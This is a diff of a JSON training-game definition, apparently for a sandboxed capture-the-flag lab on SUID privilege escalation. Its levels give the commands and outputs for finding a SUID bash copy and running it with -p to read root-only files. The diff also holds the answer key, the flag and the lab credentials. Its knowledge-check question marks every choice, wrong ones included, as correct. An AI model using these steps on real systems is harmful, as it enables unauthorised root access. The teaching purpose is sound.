@@ -1,23 +1,24 @@
 {
-  "title": "SUID Privilege Escalation",
-  "description": "Learn to discover and exploit SUID binaries to escalate privileges on a Linux server.",
+  "title": "SUID Privilege Escalation — NovaTech Solutions",
+  "description": "Discover and exploit a misconfigured SUID binary left by a careless sysadmin to escalate from a low-privilege account to root on a corporate backup server.",
   "prerequisites": [],
   "outcomes": [
-    "Understand what the SUID bit is and why it is dangerous when set on a shell binary.",
-    "Use find to enumerate SUID binaries on a system.",
-    "Exploit a misconfigured SUID binary to read files protected by root."
+    "Use nmap to identify an SSH service and confirm the target port.",
+    "Read a sysadmin note that reveals a misconfiguration left behind after a maintenance window.",
+    "Use find to enumerate SUID binaries and identify the suspicious non-standard one.",
+    "Exploit a SUID copy of bash with the -p flag to execute commands as root and read protected files."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
   "variant_sandboxes": false,
-  "estimated_duration": 30,
+  "estimated_duration": 45,
   "levels": [
     {
       "title": "Introduction",
       "level_type": "INFO_LEVEL",
       "order": 0,
       "estimated_duration": 0,
-      "content": "# General information — please read carefully\n\n* The result of each level is needed to complete the next one. Do not skip ahead.\n* If you get stuck, use the hints or Google.\n* This game is for educational purposes only. Only attack systems within this sandbox.\n\n# Storyline\n\nYou are a penetration tester contracted by NovaTech Solutions to audit their backup server. The IT team has handed you a low-privilege account — `trainee` — and asked you to see how far you can get. During a recent change window, a careless sysadmin installed a 'debug shell' on the server and forgot to remove it. Your job: find it, exploit it, and prove you can read root's files."
+      "content": "# General information — please read carefully\n\n* Each level builds on the previous one. Do not skip ahead.\n* If you get stuck, use the hints — or search for the technique online.\n* This exercise is for educational purposes only. Only attack systems within your sandbox.\n\n# Storyline\n\nYou are a junior penetration tester at SecureWave Ltd. Your current engagement is with **NovaTech Solutions**, a technology consultancy that provides managed IT services to mid-market clients. NovaTech has asked you to perform an internal privilege escalation assessment — they want to understand what an attacker could do if they already had a foothold inside their network.\n\nThe IT team has given you a low-privilege account: `trainee`, password `letmein123`. This account was created for onboarding interns and has no special privileges. The server you are targeting is NovaTech's backup management server — a host that stores configuration data, backup credentials, and logs from their client deployments.\n\nThree weeks ago, during an emergency maintenance window, a senior sysadmin needed to perform some diagnostics on this server but found themselves locked out of the root account. In a moment of impatience, they copied the bash binary to a custom location, set the SUID bit on it, and used it to complete the emergency task. They left a note in the trainee account's home directory as a reminder to remove it. That note is still there. The binary is still there.\n\nSUID stands for Set User ID. When set on an executable owned by root, any user who runs that executable has it run with root's effective user ID — regardless of their own permissions. For standard system binaries like `su`, `passwd`, and `sudo`, this is intentional and carefully controlled. For a full copy of bash, it is catastrophic: bash is a general-purpose shell that can run any command, and with SUID it runs those commands as root.\n\nYour mission: connect to the server, find the note, locate the SUID binary, confirm it gives you root-level command execution, and use it to read the flag stored in root's home directory. This is one of the most common privilege escalation vectors found in real penetration tests. It combines a careless configuration decision with a failure to clean up."
     },
     {
       "title": "Get Access",
@@ -25,95 +26,31 @@
       "order": 1,
       "estimated_duration": 0,
       "passkey": "start",
-      "cloud_content": "SSH to the attacker machine at **10.1.28.23** using your assigned credentials, then connect to the target server:\n\n```\nssh trainee@10.1.28.10\nPassword: letmein123\n```\n\nThe target server is at **10.1.28.10**. Do not attack anything outside this sandbox. Submit **start** to begin.",
-      "local_content": "SSH directly to the target server:\n\n```\nssh -p 2222 trainee@127.0.0.1\nPassword: letmein123\n```\n\nSubmit **start** to begin."
+      "cloud_content": "SSH to your attacker machine at **10.1.28.23** using your assigned credentials. Your target is the NovaTech backup server at **10.1.28.10** (SSH port 22).\n\nYou will log in to the target as:\n- Username: **trainee**, Password: **letmein123**\n\nDo not attack anything outside this sandbox. Submit **start** to begin.",
+      "local_content": "The target SSH service is running locally on port **2222**.\n\n```\nsshpass -p letmein123 ssh -o StrictHostKeyChecking=no -p 2222 trainee@127.0.0.1\n```\n\nSubmit **start** to begin."
     },
     {
-      "title": "Find the SUID Binary",
+      "title": "Identify the SSH Service",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
       "estimated_duration": 8,
-      "answer": "suid-shell",
+      "answer": "22",
       "answer_variable_name": null,
       "variant_answers": false,
-      "content": "You are now logged in as `trainee` on the NovaTech backup server. You have very limited privileges — you cannot read `/root/` or any admin files.\n\nOne of the most common privilege escalation vectors on Linux is a misconfigured **SUID binary**. When a binary has the SUID (Set User ID) bit set and is owned by root, it runs as root regardless of who executes it. Attackers search for non-standard SUID binaries that should not be there.\n\nTo list all SUID binaries on the system:\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nLook at the output carefully. Most SUID binaries are standard system utilities (`sudo`, `passwd`, `su`). One binary in `/usr/local/bin/` does not belong there.\n\n**What is the filename (not full path) of the suspicious non-standard SUID binary?**",
-      "solution": "```\ntrainee@server:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/su\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/umount\n/usr/local/bin/suid-shell\n```\n\nThe suspicious binary is **suid-shell** — everything else is a standard system utility.",
+      "content": "Before connecting to the target, confirm the SSH port with an nmap version scan:\n\n```\nnmap -sV 10.1.28.10\n```\n\nEven when you know the protocol, confirming the exact port is good practice — administrators sometimes move SSH to reduce automated scan noise, and a full scan ensures nothing is missed.\n\nLook at the nmap output and find the row for the SSH service. Note the port number.\n\n**What port is SSH listening on?**",
+      "solution": "```\n$ nmap -sV 10.1.28.10\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH ...\n```\n\nSSH is on port **22**.",
       "solution_penalized": false,
       "hints": [
         {
-          "title": "What command finds SUID binaries?",
-          "content": "Use `find` with the `-perm` flag. The SUID bit in numeric mode is `4000`. To find files with this bit set: `find / -perm -4000 -type f 2>/dev/null`",
-          "hint_penalty": 2,
-          "order": 0
-        },
-        {
-          "title": "What does the output look like?",
-          "content": "Most results will be in `/usr/bin/` — those are expected. Look for anything in `/usr/local/bin/` which is where local custom binaries live.",
-          "hint_penalty": 5,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 15,
-      "mitre_techniques": [
-        { "technique_key": "TA0007.T1083" }
-      ]
-    },
-    {
-      "title": "Confirm Root Access",
-      "level_type": "TRAINING_LEVEL",
-      "order": 3,
-      "estimated_duration": 8,
-      "answer": "root",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You found `/usr/local/bin/suid-shell`. It is owned by root and has the SUID bit set.\n\nThis binary is a copy of bash. On modern Linux systems, bash drops its elevated privileges by default when it detects that the effective UID differs from the real UID — a safety measure. However, the **`-p` (privileged) flag** disables this protection and keeps the root effective UID.\n\nRun the binary with `-p` and ask it who it is running as:\n\n```\n/usr/local/bin/suid-shell -p -c 'whoami'\n```\n\nNote the sysadmin's maintenance note in your home directory (`cat ~/note.txt`) — it confirms a debug shell was deliberately left here.\n\n**What username does the `whoami` command return when run through suid-shell -p?**",
-      "solution": "```\ntrainee@server:~$ /usr/local/bin/suid-shell -p -c 'whoami'\nroot\n```\n\nThe binary runs as **root** because of the SUID bit and the `-p` flag.",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "Which flag keeps bash's elevated privileges?",
-          "content": "Bash drops SUID privileges by default. The `-p` flag (privileged mode) prevents this. Try: `/usr/local/bin/suid-shell -p -c 'whoami'`",
+          "title": "How to scan for SSH",
+          "content": "Run nmap -sV 10.1.28.10. Look for 'ssh' in the SERVICE column — the port number is in the first column before /tcp.",
           "hint_penalty": 5,
           "order": 0
         },
         {
-          "title": "What should the answer be?",
-          "content": "If SUID is working correctly, you are running as the file's owner. Check who owns `suid-shell` with `ls -la /usr/local/bin/suid-shell`.",
-          "hint_penalty": 8,
-          "order": 1
-        }
-      ],
-      "incorrect_answer_limit": 10,
-      "attachments": [],
-      "max_score": 20,
-      "mitre_techniques": [
-        { "technique_key": "TA0004.T1548" }
-      ]
-    },
-    {
-      "title": "Read the Root Flag",
-      "level_type": "TRAINING_LEVEL",
-      "order": 4,
-      "estimated_duration": 5,
-      "answer": "WMG{su1d_b4sh_pr1v3sc_1s_trivial}",
-      "answer_variable_name": null,
-      "variant_answers": false,
-      "content": "You have confirmed that `/usr/local/bin/suid-shell -p` gives you an effective UID of root. The flag is stored in `/root/flag.txt`, owned by root with permissions `0400` — no one but root can read it directly.\n\nUse your root access to read it:\n\n```\n/usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'\n```\n\nIn a real engagement this same technique lets an attacker read `/etc/shadow`, SSH private keys, database credentials, or any other root-protected file on the system.\n\n**Submit the flag from `/root/flag.txt`.**",
-      "solution": "```\ntrainee@server:~$ /usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'\nWMG{su1d_b4sh_pr1v3sc_1s_trivial}\n```",
-      "solution_penalized": true,
-      "hints": [
-        {
-          "title": "How to read a file with the SUID shell?",
-          "content": "Use the same pattern as the previous level: `/usr/local/bin/suid-shell -p -c 'cat /path/to/file'`",
+          "title": "Default SSH port",
+          "content": "SSH uses port 22 by default. Unless the admin changed it, nmap shows 22/tcp open ssh.",
           "hint_penalty": 10,
-          "order": 0
-        },
-        {
-          "title": "Where is the flag?",
-          "content": "The flag is in `/root/flag.txt`.",
-          "hint_penalty": 20,
           "order": 1
         }
       ],
@@ -121,16 +58,206 @@
       "attachments": [],
       "max_score": 50,
       "mitre_techniques": [
+        { "technique_key": "TA0043.T1046" }
+      ]
+    },
+    {
+      "title": "Read the Sysadmin Note",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 8,
+      "answer": "/usr/local/bin/",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Log in to the target server as the `trainee` account:\n\n```\nsshpass -p 'letmein123' ssh -o StrictHostKeyChecking=no trainee@10.1.28.10\n```\n\nOnce connected, list files in the home directory and read the note:\n\n```\nls -la ~\ncat ~/note.txt\n```\n\nThe note describes a debug tool installed during a maintenance window. It names the exact directory where the binary was placed. Read carefully — this is the clue that guides your next steps.\n\n**What directory path does the note say the debug shell was installed in?**",
+      "solution": "```\n$ cat ~/note.txt\nNovaTech Systems - Maintenance Note\nA debug shell has been installed at /usr/local/bin/ for troubleshooting.\nRemember to remove it after the maintenance window. -- IT Operations\n```\n\nThe note points to **/usr/local/bin/**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to read the note",
+          "content": "Log in with sshpass -p 'letmein123' ssh trainee@10.1.28.10, then run: cat ~/note.txt. The note mentions the installation directory of the debug shell.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "What directory is used for local binaries?",
+          "content": "Linux uses /usr/local/bin/ for locally installed binaries not managed by the package manager. A sysadmin placing a custom binary would likely put it there.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "The directory path",
+          "content": "The note says the debug shell was installed at /usr/local/bin/ (include the trailing slash).",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
+      ]
+    },
+    {
+      "title": "Find the SUID Binary",
+      "level_type": "TRAINING_LEVEL",
+      "order": 4,
+      "estimated_duration": 10,
+      "answer": "suid-shell",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Search the entire filesystem for files with the SUID bit set:\n\n```\nfind / -perm -4000 -type f 2>/dev/null\n```\n\nBreaking this down:\n- `-perm -4000` — matches files where the SUID bit (octal 4000) is set\n- `-type f` — regular files only\n- `2>/dev/null` — suppresses permission-denied errors\n\nThe output includes standard system binaries (`/usr/bin/sudo`, `/usr/bin/passwd`) — these are expected. Look for any SUID binary in `/usr/local/bin/` — the directory the note mentioned.\n\n**What is the filename (not full path) of the suspicious SUID binary in /usr/local/bin/?**",
+      "solution": "```\n$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/su\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/mount\n/usr/local/bin/suid-shell\n```\n\nThe suspicious binary is **suid-shell** in `/usr/local/bin/`.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to find SUID binaries",
+          "content": "Use: find / -perm -4000 -type f 2>/dev/null. The -perm -4000 flag matches files with the SUID bit set. Most results in /usr/bin/ are normal — look for anything in /usr/local/bin/.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to identify the suspicious one",
+          "content": "Standard SUID binaries live in /usr/bin/ or /bin/. Anything in /usr/local/bin/ with SUID is unusual — the note told you to look there.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The binary name",
+          "content": "The binary is named suid-shell, in /usr/local/bin/. Its name alone tells you exactly what the sysadmin configured.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1083" }
+      ]
+    },
+    {
+      "title": "Confirm Root Execution",
+      "level_type": "TRAINING_LEVEL",
+      "order": 5,
+      "estimated_duration": 8,
+      "answer": "root",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You found `/usr/local/bin/suid-shell` — a copy of bash owned by root with the SUID bit set.\n\nOn modern Linux, bash drops elevated privileges by default when it detects its effective UID differs from its real UID. The **`-p` flag** (privileged mode) disables this protection:\n\n```\n/usr/local/bin/suid-shell -p -c 'whoami'\n```\n\nThe `-c 'whoami'` runs the command and exits. If the SUID is working correctly, `whoami` will return the file owner's name.\n\nYou can also verify with `id` for full UID information:\n\n```\n/usr/local/bin/suid-shell -p -c 'id'\n```\n\n**What does whoami return when run through /usr/local/bin/suid-shell -p?**",
+      "solution": "```\n$ /usr/local/bin/suid-shell -p -c 'whoami'\nroot\n```\n\nThe binary runs as **root** — confirmed by the SUID bit and -p flag.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Why use -p with bash?",
+          "content": "Bash drops SUID privileges by default as a security measure. The -p (privileged) flag prevents this and keeps the elevated effective UID from the SUID bit.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to confirm root access",
+          "content": "Run: /usr/local/bin/suid-shell -p -c 'whoami'. If the SUID is working, whoami outputs 'root' because the file is owned by root and has the SUID bit.",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "Expected output",
+          "content": "The output is 'root' — confirming effective root UID via the SUID binary.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0004.T1548" }
+      ]
+    },
+    {
+      "title": "Read the Root Flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 6,
+      "estimated_duration": 5,
+      "answer": "WMG{su1d_b4sh_pr1v3sc_1s_trivial}",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "You have confirmed root-level code execution. The flag is at `/root/flag.txt` — mode `0400`, readable only by root. The `trainee` account cannot read it directly:\n\n```\n/usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'\n```\n\nIn a real engagement, this access would also let you read `/etc/shadow` (password hashes), SSH private keys, database credentials from service configs, and install persistence mechanisms. One careless `chmod +s` command that was never cleaned up opened all of that.\n\n**Submit the flag from /root/flag.txt.**",
+      "solution": "```\n$ /usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'\nWMG{su1d_b4sh_pr1v3sc_1s_trivial}\n```",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to read a file with the SUID shell",
+          "content": "Use: /usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'. Replace the whoami from the previous level with cat and the flag path.",
+          "hint_penalty": 20,
+          "order": 0
+        },
+        {
+          "title": "Where is the flag?",
+          "content": "The flag is at /root/flag.txt with mode 0400 (root read only). Use the SUID shell to bypass the permission check.",
+          "hint_penalty": 30,
+          "order": 1
+        },
+        {
+          "title": "Flag format",
+          "content": "The flag starts with WMG{ and ends with }.",
+          "hint_penalty": 40,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 150,
+      "mitre_techniques": [
         { "technique_key": "TA0006.T1552" }
+      ]
+    },
+    {
+      "title": "Read a Protected System File",
+      "level_type": "TRAINING_LEVEL",
+      "order": 7,
+      "estimated_duration": 5,
+      "answer": "/bin/bash",
+      "answer_variable_name": null,
+      "variant_answers": false,
+      "content": "Use your root access to examine the system's user configuration. Read the `/etc/passwd` entry for the `trainee` account:\n\n```\n/usr/local/bin/suid-shell -p -c 'grep trainee /etc/passwd'\n```\n\nThe `/etc/passwd` format is: `username:x:UID:GID:comment:home_directory:shell`\n\nThe last field (after the final colon) is the user's default login shell — the program that runs when the user logs in.\n\nIn a real engagement you would use this root access to read `/etc/shadow` for password hashes, or examine service configuration files for credentials.\n\n**What is the full path of the shell assigned to the trainee account in /etc/passwd?**",
+      "solution": "```\n$ /usr/local/bin/suid-shell -p -c 'grep trainee /etc/passwd'\ntrainee:x:1000:1000::/home/trainee:/bin/bash\n```\n\nThe shell is **/bin/bash** — the last colon-separated field.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "How to read a specific passwd entry",
+          "content": "Run: /usr/local/bin/suid-shell -p -c 'grep trainee /etc/passwd'. This filters the passwd file for the trainee line.",
+          "hint_penalty": 15,
+          "order": 0
+        },
+        {
+          "title": "How to read the /etc/passwd format",
+          "content": "The /etc/passwd format is: username:x:UID:GID:comment:home:shell. Count the colons — the shell is the 7th field (after the 6th colon).",
+          "hint_penalty": 25,
+          "order": 1
+        },
+        {
+          "title": "The shell path",
+          "content": "The trainee account uses /bin/bash as its login shell. This is the default for user accounts on Ubuntu.",
+          "hint_penalty": 30,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "mitre_techniques": [
+        { "technique_key": "TA0007.T1087" }
       ]
     },
     {
       "title": "Feedback",
       "level_type": "ASSESSMENT_LEVEL",
-      "order": 5,
+      "order": 8,
       "estimated_duration": 5,
       "assessment_type": "QUESTIONNAIRE",
-      "instructions": "Please answer the questions below to help us improve this game.",
+      "instructions": "Please answer these questions to help us improve this game.",
       "questions": [
         {
           "question_type": "MCQ",
@@ -153,23 +280,37 @@
           "order": 1,
           "answer_required": true,
           "choices": [
-            { "text": "Yes, I knew this already", "correct": true, "order": 0 },
-            { "text": "I had heard of it",         "correct": true, "order": 1 },
-            { "text": "No, this was new to me",    "correct": true, "order": 2 }
+            { "text": "Yes, I had exploited SUID binaries before", "correct": true, "order": 0 },
+            { "text": "I had heard of SUID but not exploited it",  "correct": true, "order": 1 },
+            { "text": "No, this was completely new to me",         "correct": true, "order": 2 }
           ]
         },
         {
           "question_type": "MCQ",
-          "text": "How would you rate the clarity of the level instructions?",
+          "text": "How clear were the level instructions?",
           "points": 0,
           "penalty": 0,
           "order": 2,
           "answer_required": true,
           "choices": [
-            { "text": "Very clear",          "correct": true, "order": 0 },
+            { "text": "Very clear",         "correct": true, "order": 0 },
             { "text": "Mostly clear",        "correct": true, "order": 1 },
             { "text": "Confusing at times",  "correct": true, "order": 2 },
             { "text": "Hard to follow",      "correct": true, "order": 3 }
+          ]
+        },
+        {
+          "question_type": "MCQ",
+          "text": "What does the SUID bit do when set on a file owned by root?",
+          "points": 0,
+          "penalty": 0,
+          "order": 3,
+          "answer_required": true,
+          "choices": [
+            { "text": "The file runs with root effective UID regardless of who executes it", "correct": true, "order": 0 },
+            { "text": "Only root can execute the file",                                      "correct": true, "order": 1 },
+            { "text": "The file is hidden from non-root users",                              "correct": true, "order": 2 },
+            { "text": "The file cannot be modified by non-root users",                       "correct": true, "order": 3 }
           ]
         },
         {
@@ -177,7 +318,7 @@
           "text": "What would you change or add to improve this game?",
           "points": 0,
           "penalty": 0,
-          "order": 3,
+          "order": 4,
           "answer_required": false,
           "choices": []
         }
